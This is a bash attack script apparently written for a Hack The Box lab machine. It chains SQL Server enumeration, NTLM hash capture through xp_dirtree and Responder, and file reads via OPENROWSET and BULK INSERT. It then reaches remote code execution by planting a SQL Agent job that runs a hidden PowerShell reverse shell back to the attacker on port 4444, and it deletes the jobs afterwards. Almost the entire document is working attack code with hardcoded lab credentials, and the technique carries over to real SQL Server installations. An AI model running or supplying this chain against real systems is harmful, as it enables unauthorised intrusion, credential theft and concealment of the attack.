#!/bin/bash
# HTB MSSQL Service Account → RCE Script
# Target: SQL Server 2022 on DC01 (SIGNED.HTB\mssqlsvc:purPLE9795!@)

TARGET="10.129.242.173"
USER="mssqlsvc"
PASS="purPLE9795!@"
DOMAIN="SIGNED.HTB"

echo "[+] MSSQL Enumeration & Exploitation Script"

# 1. RID Brute (enumerate domain users)
echo "[+] Step 1: RID Brute Force (already done)"
echo "nxc mssql $TARGET -u users.txt -p '$PASS' --rid-brute"

# 2. Basic Enumeration
echo ""
echo "[+] Step 2: Basic Enumeration"
nxc mssql $TARGET -u $USER -p "$PASS" --query "SELECT name FROM sys.databases"
nxc mssql $TARGET -u $USER -p "$PASS" --query "SELECT name, type_desc FROM sys.server_principals WHERE type IN ('S','U')"
nxc mssql $TARGET -u $USER -p "$PASS" --query "SELECT IS_SRVROLEMEMBER('sysadmin') AS IsSysadmin"

# 3. File System Recon (xp_dirtree/xp_fileexist)
echo ""
echo "[+] Step 3: File System Recon"
nxc mssql $TARGET -u $USER -p "$PASS" --query "EXEC xp_dirtree 'C:\\Users'"
nxc mssql $TARGET -u $USER -p "$PASS" --query "EXEC xp_fileexist 'C:\\Users\\mssqlsvc\\Desktop\\user.txt'"
nxc mssql $TARGET -u $USER -p "$PASS" --query "EXEC xp_dirtree 'C:\\inetpub\\wwwroot'"

# 4. Database Privileges
echo ""
echo "[+] Step 4: Database Privileges"
nxc mssql $TARGET -u $USER -p "$PASS" --query "SELECT name, is_trustworthy_on FROM sys.databases"
nxc mssql $TARGET -u $USER -p "$PASS" --query "USE msdb; SELECT * FROM fn_my_permissions(NULL, 'DATABASE')"

# 5. msdb SQL Agent Roles (CRITICAL)
echo ""
echo "[+] Step 5: msdb SQL Agent Roles"
nxc mssql $TARGET -u $USER -p "$PASS" --query "USE msdb; SELECT name, type_desc FROM sys.database_principals WHERE name='guest'"
nxc mssql $TARGET -u $USER -p "$PASS" --query "USE msdb; SELECT r.name FROM sys.database_role_members rm JOIN sys.database_principals r ON rm.role_principal_id=r.principal_id WHERE r.name LIKE '%SQLAgent%'"

# 6. Responder Hash Capture (if needed)
echo ""
echo "[+] Step 6: Responder NTLM Hash (run Responder first)"
echo "sudo responder -I tun0"
echo "# Then:"
nxc mssql $TARGET -u $USER -p "$PASS" --query "EXEC xp_dirtree '\\\\$(hostname -I | awk '{print \$1}')\\share'"

# 7. File Read Attempts
echo ""
echo "[+] Step 7: File Read Attempts"
nxc mssql $TARGET -u $USER -p "$PASS" --query "SELECT * FROM OPENROWSET(BULK 'C:\\Users\\mssqlsvc\\Desktop\\user.txt', SINGLE_CLOB) AS x"
nxc mssql $TARGET -u $USER -p "$PASS" --query "CREATE TABLE #f(f varchar(100)); BULK INSERT #f FROM 'C:\\Users\\mssqlsvc\\Desktop\\user.txt'; SELECT * FROM #f; DROP TABLE #f"

# 8. SQL AGENT RCE (MONEYSHOT)
echo ""
echo "[+] Step 8: SQL AGENT REVERSE SHELL"
echo "nc -lnvp 4444 &"
read -p "Press enter after nc listener ready (YOUR_IP=$(hostname -I | awk '{print \$1}')):"
nxc mssql $TARGET -u $USER -p "$PASS" --query "USE msdb; EXEC sp_add_job @job_name='revshell'; EXEC sp_add_jobstep @job_name='revshell', @step_id=1, @step_name='pwn', @command='powershell.exe -nop -w hidden -c \"\$client=New-Object System.Net.Sockets.TCPClient('$(hostname -I | awk '{print \$1}')',4444);\$s=\$client.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-ne0){\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(\"PS \"+\$d+'#> ');\$sb2=iex \$sb 2>&1 | Out-String;\$sbbytes=([text.encoding]::ASCII).GetBytes(\$sb2+'PS> ');\$s.Write(\$sbbytes,0,\$sbbytes.Length);\$s.Flush()};\$client.Close();\"'; EXEC sp_add_jobserver @job_name='revshell'; EXEC sp_start_job @job_name='revshell'"

# 9. Read user.txt via SQL Agent
echo ""
echo "[+] Step 9: user.txt via SQL Agent"
nxc mssql $TARGET -u $USER -p "$PASS" --query "USE msdb; EXEC sp_add_job @job_name='getflag'; EXEC sp_add_jobstep @job_name='getflag', @step_id=1, @step_name='flag', @command='powershell \"Get-Content C:\\Users\\mssqlsvc\\Desktop\\user.txt\"'; EXEC sp_add_jobserver @job_name='getflag'; EXEC sp_start_job @job_name='getflag'"

# 10. Cleanup
echo ""
echo "[+] Step 10: Cleanup Jobs"
nxc mssql $TARGET -u $USER -p "$PASS" --query "USE msdb; EXEC sp_delete_job @job_name='revshell'"
nxc mssql $TARGET -u $USER -p "$PASS" --query "USE msdb; EXEC sp_delete_job @job_name='getflag'"

echo ""
echo "[+] Test other RID users:"
echo "nxc mssql $TARGET -u 'SIGNED\\\\IT' -p '$PASS'"
echo "nxc mssql $TARGET -u scott -p '$PASS'"
echo "nxc mssql $TARGET -u 'SIGNED\\\\Developers' -p '$PASS'"
